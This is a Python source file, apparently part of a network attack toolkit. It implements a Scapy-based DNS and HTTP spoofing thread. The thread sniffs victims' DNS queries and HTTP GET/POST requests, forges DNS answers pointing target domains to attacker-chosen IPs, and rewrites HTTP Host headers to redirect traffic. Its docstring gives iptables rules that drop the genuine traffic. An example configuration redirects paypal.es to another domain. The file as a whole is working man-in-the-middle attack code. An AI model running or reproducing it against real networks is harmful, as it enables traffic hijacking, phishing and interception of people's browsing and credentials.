import threading
from scapy.all import *

from src import files, packet_utilities
from src.log import log

#Cuando se envia un spoofed packet, no se guarda en handled packets. Lo recibo varias veces??

class DNS_Spoofer(threading.Thread):
    """Thread of the DNS Spoofing module.
    
    Sniffs every DNS packet and every HTTP post and get request. If the host 
    asked is one of the targets, a spoofed packet with the desired host is 
    created and sent. 
    This way, DNS queries with target domain are answered with the spoofed IP, 
    and HTTP requests with target hosts are forwarded with the spoofed host.
    
    Iptables rules needed:
        iptables -A FORWARD -p udp --dport 53 -j DROP
        iptables -A FORWARD -p tcp --dport 80 -m string --string 'POST' --algo
            bm -m string --string 'GET' --algo bm -j DROP
    """
    
    def __init__(self, exit_event, file_loc, timeout):
        """Creates the thread.
        
        Parameters:
            exit_event (threading.Event): the event that will be checked to
                finish the thread and so the DNS Spoofing attack.
            file_loc (str): the location of the file which contains the target
                domains and the ip or domain they should be redirected to.
            timeout (int, None): the time in seconds of the duration of the
                attack. If None, it will last until CTRL-C is pressed.
            As a Thread, it can also have any of a thread parameters. See
            help(threading.Thread) for more help.
        """
        super().__init__()
        self.exit_event = exit_event
        self.timeout = timeout
        self.handled_http_packets = []
        
        parsed_redirects = files.parse_domains_and_ips(file_loc)
        self.parsed_redirects, self.default = self._resolve_parsed_redirects(parsed_redirects)
        
        #FILE
        #* example.com
        #paypal.es pokexperto.net
        #padventures.org 192.168.191.120
   
        #parsed_redirects=                  {"paypal.es": ("45.60.23.55", "pokexperto.net"), "padventures.org": ("192.168.191.120", None)}
        #default=                           ("93.184.216.34", "example.com")
        
    
    def _resolve_parsed_redirects(self, redirects):
        """Resolves the domains of the dictionary, changes its structure and 
        returns it and the default redirect.
        
        Parameters:
            redirects (dictionary): a redirects dictionary which structure is
                the following: keys are domains that will redirected, and 
                values are the domains or the ips that each key will be 
                redirected to. It is usually given by the function
                files.parse_domains_and_ips
                
        Returns:
            tuple: a tuple which contains the redirects dictionary and a tuple
                with the default redirect. The redirects_dictionary structure
                is now:
                    {domain_redirected:(ip_to_redirect, domain_to_redirect),..}
                and the default redirect is now:
                    (ip_to_redirect, domain_to_redirect)
                
        Examples:
            FILE READ BY files.parse_domains_and_ips
                * example.com
                paypal.es pokexperto.net
                padventures.org 192.168.191.120
            
            DICTIONARY RETURNED FROM files.parse_domains_and_ips
                {"*": "example.com", "paypal.es":"pokexperto.net", 
                    "padventures.org": "192.168.191.120"}
            
            TUPLE RETURNED FROM DNS_Spoofer._resolve_parsed_redirects
                (redirect_dictionary, default_redirect)
                
            WHERE redirect_dictionary IS
                {"paypal.es": ("45.60.23.55", "pokexperto.net"), "padventures.org":
                    ("192.168.191.120", None)}
                    
            WHERE default_redirect IS
                ("93.184.216.34", "example.com")
        """
        
        
        new_redirects = {}
        
        for domain, supposed_ip in redirects.items():
            if supposed_ip == "*": #if the IP is * (which means ignore)
                new_redirects[domain] = (None, None)
                continue
            
            if not packet_utilities.is_it_an_ip(supposed_ip): #supposed_ip is actually a domain
                log.dns.info("resolve1", supposed_ip=supposed_ip)
                true_ip = packet_utilities.nslookup(supposed_ip)
                if true_ip: #we could resolve the domain
                    log.dns.info("resolve2", supposed_ip=supposed_ip, true_ip=true_ip)
                    new_redirects[domain] = (true_ip, supposed_ip)
                else: #we could not resolve the domain
                    log.dns.error("resolve", supposed_ip=supposed_ip)
                    new_redirects[domain] = (None, None)
            else: #supposed_ip is an ip
                new_redirects[domain] = (supposed_ip, None)
            
        #Redirect before taking out default:
        #{"*": ("93.184.216.34", "example.com"), "paypal.es": ("45.60.23.55", "pokexperto.net"), "padventures.org": ("192.168.191.120", None)}
        
        default = new_redirects.pop("*", (None,None)) #if there's a default, it takes it out and sets 'default' to it. else, sets 'default' to (None, None)
        
        return new_redirects, default

            
    def _get_redirect_for_domain(self, domain_queried):
        """Decides if a DNS Query or HTTP request should be answered or not.
        
        It is decided depending on whether the domain asked is one of the 
        targets or not. If it should be answered, it returns 
        (IP_to_redirect, domain_to_redirect). If it should not be answered, it
        simply returns False.
        
        Parameters:
            domain_queried (str): the domain that the dns query or the http
                request is asking for.
                
        Returns:
            tuple: a tuple which contains (IP_to_redirect, domain_to_redirect).
                Note that domain_redirect can be None.
            False: if the domain should not be spoofed.
        """
        
        for d in self.parsed_redirects.keys(): #if it is an specific rule, it looks for it
            if d in domain_queried:
                return self.parsed_redirects[d]
                
        #if it is not a rule, then the default value is returned
        #this default value can be (None, None)
        return self.default        
    
    
    #This function is needed because when you send a packet, it can be sniffed by the
    #running sniff function. As our own packets must not be handled, checking if they
    #have already been handled is needed.
    def _has_packet_been_handled(self, packet):
        """Checks if a packet has been handled, depending on its ack number,
        seq number and its TCP checksum.
        
        Parameters:
            ack (int): the ack number of the TCP packet.
            seq (int): the seq number of the TCP packet.
            has_raw (bool): True if the packet has raw layer, False otherwise.
            
        Returns:
            bool: True if it has already been handled, False otherwise. 
            """

        result = self.handled_http_packets.count((packet["TCP"].ack,packet["TCP"].seq,packet_utilities.get_checksum(packet, "TCP")))
        
        return True if result > 0 else False

    
    def _forward_http_packet(self, packet):
        """Creates a http packet according to the original packet and sends it.
        
        Parameters:
            packet (scapy.packet.Packet): the packet that will be forwarded.
        """
        
        p = IP(dst=packet["IP"].dst, src=packet["IP"].src)/ \
            TCP(dport=packet["TCP"].dport, sport=packet["TCP"].sport, ack=packet["TCP"].ack, seq=packet["TCP"].seq, flags=packet["TCP"].flags)/ \
            Raw(load=packet.load)
            
        send(p, verbose=0)
    
    
    def _forward_spoofed_http_packet(self, packet, host, spoofed_host):
        """Creates a spoofed http packet and sends it.
        
        Parameters:
            packet (scapy.packet.Packet): original packet
            host (str): the string that will be replaced by spoofed_host
            spoofed_host (str): the string that will replace host
        """
        
        p = IP(dst=packet["IP"].dst, src=packet["IP"].src, flags=packet["IP"].flags)/ \
            TCP(dport=packet["TCP"].dport, sport=packet["TCP"].sport, ack=packet["TCP"].ack, seq=packet["TCP"].seq, flags=packet["TCP"].flags)/ \
            Raw(load=packet.load.replace(host.encode("utf-8"), spoofed_host.encode("utf-8")))
        
        
        #There's a problem when the load is increased, because the server says that he has read
        #more bytes than the bytes that the client theorically sent. 
        #Example: if the original get request is 20 bytes long, and then I change it to 25,
        #the server says that he has received a request of 25 bytes. As the client theorically sent only 20,
        #an error occurs and it ignores what the server sends. There's no problem if he says
        #that he has read less bytes, so we simply take out user agents to reduce load length.
        if len(p.load) > len(packet.load): 
            diff1 = (packet["TCP"].seq + len(packet.load) - (p["TCP"].seq + len(p.load)))
            agent = packet_utilities.get_header_attribute_from_http_load("User-Agent", p.load)
            p.load = p.load.replace(agent, b" ")
            diff2 = (packet["TCP"].seq + len(packet.load) - (p["TCP"].seq + len(p.load)))
            if diff2 < 0:
                log.dns.error("len", diff1=diff1, diff2=diff2)

        send(p, verbose=0)
    
    
    def _add_handled_packet(self, packet):
        """Adds a packet to the list of handled packets.
        
        It adds a tuple which contains the packet ack number, the packet seq 
        number and the packet TCP checksum.
        
        Parameters:
            packet (scapy.packet.Packet): handled packet
        """
        
        data = (packet.ack, packet.seq, packet_utilities.get_checksum(packet, "TCP"))
        self.handled_http_packets.append(data)
        #print(len(self.handled_http_packets))
        
        
    def _handle_http_packet(self, packet):
        """Handles a http packet.
        
        If the packet has not been handled before, depending on the asked host,
        a spoofed packet is created and sent or the packet is simply forwarded.
        
        Parameters:
            packet (scapy.packet.Packet): handled packet
        """
        
        if not self._has_packet_been_handled(packet):
            self._add_handled_packet(packet)
            
            host = packet_utilities.get_host(packet.load)
            if not host:
                print("failed getting host from", packet.load)
            spoofed_domain = self._get_redirect_for_domain(host)[1]
            
            if spoofed_domain: #si el host pedido tiene una redireccion a otro dominio:
                self._forward_spoofed_http_packet(packet, host, spoofed_domain)
                log.dns.info("http_request", host=host, spoofed_domain=spoofed_domain)
                
            else:
                #si no hay una ip asociada, o no hay un dominio asociada a esta ip,
                self._forward_http_packet(packet)
        
    
    def _answer_dns_packet(self, packet, ip_redirect):
        """Answers a DNS Query.
        
        It creates a spoofed DNS Answer to answer the query according to the
        desired ip.
        
        Parameters:
            packet (scapy.packet.Packet): DNS Query packet
            ip_redirect (str): the IP that the answer will contain.
        """
        
        # ~ answer = Ether(dst=packet["Ether"].src, src=packet["Ether"].dst, type=0x800)/ \
        answer = IP(id=0,src=packet["IP"].dst, dst=packet["IP"].src, flags="DF")/ \
        UDP(sport=53, dport=packet["UDP"].sport)/ \
        DNS(id = packet["DNS"].id, aa=1, qr=1, ra=1, ancount=1, ar=packet["DNS"].ar, qd=packet["DNS"].qd, \
        an=DNSRR(rrname=packet["DNS"].qd.qname, rdata=ip_redirect, ttl=1047)) / Raw(load="KISS")
        
        send(answer, verbose=0)
        
        
        # ~ print(packet.summary())
        # ~ print(answer.summary())
        # ~ packet.show()
        # ~ answer.show2()
    
    
    def _forward_dns_packet(self, packet):
        """Creates a DNS Packet according to the original packet and sends it.
        
        Parameters:
            packet (scapy.packet.Packet): DNS packet. Note that this is not
                necessarily a DNS Query.
        """
        
        
        pkt_redirect = IP(src=packet["IP"].src, dst=packet["IP"].dst)/ \
        UDP(sport=packet["UDP"].sport, dport=packet["UDP"].dport)/ \
        packet.getlayer("DNS")/Raw(load="KISS")
        #DNS Is the last layer, there are no more layers inside it, so i can do that.

            
        send(pkt_redirect, verbose=0)


    
    def _handle_dns_packet(self, packet):
        """Handles a DNS packet. 
        
        If the packet is a query that asks for one of the target domains, a
        spoofed answer is sent with the desired IP address. If not, the packet
        is simply forwarded.
        
        Parameters:
            packet (scapy.packet.Packet): DNS packet. Note that this is not
                necessarily a DNS Query.
        """
        
        if packet["DNS"].rcode != 0 or (packet.haslayer("Raw") and b"KISS" in packet.load): #si ha dado error, o es uno de mis paquetes, pafuera
            return
            
        
        if not packet["DNS"].an: #si es un query (no lleva respuesta)
            domain_queried = packet["DNS"].qd.qname.decode("utf-8", "ignore")
            ip_redirect = self._get_redirect_for_domain(domain_queried)[0]
            if ip_redirect:
                log.dns.info("dns_query", domain_queried = domain_queried, ip_redirect = ip_redirect)
                self._answer_dns_packet(packet, ip_redirect)
            else:
                #no hacer forward a un paquete al que ya se le hizo forward
                # ~ print("[DNS] DNS packet domain", domain_queried, "from", packet["IP"].src, "to", packet["IP"].dst, end="")
                # ~ print("Type: answer. Forwarding...") if packet["DNS"].an else print("Type: query. Forwarding...")

                self._forward_dns_packet(packet)
            
            
    def _handle_packet(self, packet):
        """Handled every packet.
        
        If it is a DNS Packet, it calls _handle_dns_packet. Else, if it has
        a Raw layer, it calls _handle_http_packet.
        
        Params:
            packet (scapy.packet.Packet): the handled packet, which can be
                a DNS Packet or a HTTP Packet.
        """
        #if not self._has_packet_been_handled(packet.ack, packet.seq, packet.haslayer("Raw")):
        if packet.haslayer("DNS"): #paquetes DNS
            self._handle_dns_packet(packet)
        elif packet.haslayer("Raw"):# and b"GET" in packet["Raw"].load:
            self._handle_http_packet(packet)
        
            
            
    def run(self):
        """Method representing the thread's activity. It is started when start
        function is called.
        
        It sniffes every DNS packet and every HTTP request packet and handles
        them, deciding to spoof it or not.
        """
        log.dns.info("start",timeout=self.timeout)
        
        try:
            #SNIFF, al tener stopperTimeout y stopper, no es la funcion original de Scapy, sino una modificada por mi
        #ya que la original no tenía manera de pararse cuando se quisiera. más informacion en sendrecv de Scapy
        #lo malo de esto es que para de sniffear cada stopperTimeout segundos para comprobar si stopper devuelve True,
        #con lo que puede perder algun paquete en ese proceso (cuando escribo esto aun no se ha dado el caso)
        
        #          es un paquete DNS y es IP (hay algunos que son ICMP host redirect) o bien es tcp, y en la capa raw tiene GET o POST
            sniff(filter="udp or tcp and (dst port 80 or dst port 53)",
                  lfilter = lambda x: ((x.haslayer("DNS") and x.haslayer("IP")) or (x.haslayer("TCP") and x.haslayer("Raw") and ((b"POST" in x["Raw"].load) or (b"GET" in x["Raw"].load)))),
                  prn=self._handle_packet, store=False, timeout=self.timeout, stopperTimeout=3, stopper=self.exit_event.is_set)
                  
            #sniff(filter="tcp", lfilter = lambda x: x.haslayer("Raw") and b"GET" in x["Raw"].load, prn=self._handle_dns_packet, store=False, timeout=self.timeout, stopperTimeout=3, stopper=self.exit_event.is_set)
        except PermissionError as err:
            log.dns.error("permission_sniffing", err = err)
            
        log.dns.info("finish")
        
        
        


        

